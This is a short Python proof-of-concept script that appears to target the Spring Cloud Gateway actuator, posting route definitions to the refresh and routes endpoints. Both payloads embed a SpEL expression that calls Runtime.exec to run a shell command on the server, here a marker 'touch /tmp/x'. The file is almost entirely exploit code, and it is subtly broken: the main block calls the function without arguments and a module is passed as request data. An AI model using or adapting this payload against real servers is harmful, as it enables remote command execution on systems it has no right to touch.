from itsdangerous import json
import requests



def exec(url, cmd):

    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36',
        'content-type':'application/json'
    }
    payload1 = '''{ "predicate": "Paths: [/new_route], match trailing slash: true", "route_id": "new_route", "filters": [ "[[RewritePath #{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/x\")} = /${path}], order = 1]" ], "uri": "https://wya.pl", "order": 0 }'''
    payload2 = '''{ "predicates": [ { "name": "Path", "args": { "_genkey_0": "/new_route/**" } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/x\")}", "_genkey_1": "/${path}" } } ], "uri": "https://wya.pl", "order": 0 }'''


    url1 = url + "/actuator/gateway/refresh"
    url2 = url + "/actuator/gateway/routes/new_route"

    
    
    re1 = requests.post(url=url1,data=payload1,headers=headers,json=json,proxies={"http": "http://127.0.0.1:8080"})
    re2 = requests.post(url=url2,data=payload2,headers=headers,json=json,proxies={"http": "http://127.0.0.1:8080"})


if __name__ == "__main__":
    exec()